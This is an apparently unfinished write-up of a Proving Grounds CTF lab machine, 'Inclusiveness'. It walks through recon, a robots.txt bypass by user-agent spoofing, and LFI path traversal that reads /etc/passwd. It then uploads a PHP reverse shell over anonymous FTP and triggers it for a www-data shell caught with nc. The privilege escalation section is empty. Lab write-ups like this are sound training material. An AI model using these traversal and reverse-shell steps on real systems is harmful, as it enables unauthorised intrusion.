---
title:
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open 192.168.143.14
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 16:00 +0900
Nmap scan report for 192.168.143.14
Host is up (0.089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.240
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=5/17%OT=21%CT=1%CU=37382%PV=Y%DS=4%DC=T%G=Y%TM=6A0967C
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=106%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GC
OS:D=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M57
OS:8NNT11NW7%O4=M578ST11NW7%O5=M578ST11NW7%O6=M578ST11)WIN(W1=7120%W2=7120%
OS:W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M578NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   87.85 ms 192.168.45.1
2   87.74 ms 192.168.45.254
3   87.87 ms 192.168.251.1
4   87.95 ms 192.168.143.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.96 seconds
```

# FTP
## 21
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ ftp 192.168.143.14 
Connected to 192.168.143.14.
220 (vsFTPd 3.0.3)
Name (192.168.143.14:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34818|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub
226 Directory send OK.

```

# HTTP
## 80

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ feroxbuster \
-u http://192.168.143.14 \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

http://192.168.143.14/robots.txt
![](../../../assets/images/Pasted%20image%2020260517171811.png)

```zsh
sudo curl -s --user-agent Googlebot http://192.168.143.14/robots.txt -v
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ sudo curl -s --user-agent Googlebot http://192.168.143.14/robots.txt -v
[sudo] password for kali: 
*   Trying 192.168.143.14:80...
* Established connection to 192.168.143.14 (192.168.143.14 port 80) from 192.168.45.240 port 41588 
* using HTTP/1.x
> GET /robots.txt HTTP/1.1
> Host: 192.168.143.14
> User-Agent: Googlebot
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 17 May 2026 08:18:25 GMT
< Server: Apache/2.4.38 (Debian)
< Last-Modified: Sat, 08 Feb 2020 03:26:11 GMT
< ETag: "2d-59e08115bb1ef"
< Accept-Ranges: bytes
< Content-Length: 45
< Content-Type: text/plain
< 
User-agent: *
Disallow: /secret_information/
* Connection #0 to host 192.168.143.14:80 left intact
```

![](../../../assets/images/Pasted%20image%2020260517173155.png)

### Click english 

http://192.168.143.14/secret_information/?lang=en.php

*Like LFI*

http://192.168.143.14/secret_information/?lang=../../../../etc/passwd

![](../../../assets/images/Pasted%20image%2020260517175022.png)

http://192.168.143.14/secret_information/?lang=../../../../etc/vsftpd.conf

![](../../../assets/images/Pasted%20image%2020260517181205.png)

---

# Initial Access


```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ ftp 192.168.143.14
Connected to 192.168.143.14.
220 (vsFTPd 3.0.3)
Name (192.168.143.14:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52161|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||48584|)
150 Ok to send data.
100% |***********************************************************************|  5496       26.07 MiB/s    00:00 ETA
226 Transfer complete.
5496 bytes sent in 00:00 (29.57 KiB/s)
ftp> quit
221 Goodbye.
```

http://192.168.143.14/secret_information/?lang=../../../../../var/ftp/pub/php-reverse-shell.php

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Inclusiveness]
└─$ rlwrap -cAr nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.240] from (UNKNOWN) [192.168.143.14] 41290
Linux inclusiveness 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
 19:42:54 up  3:46,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```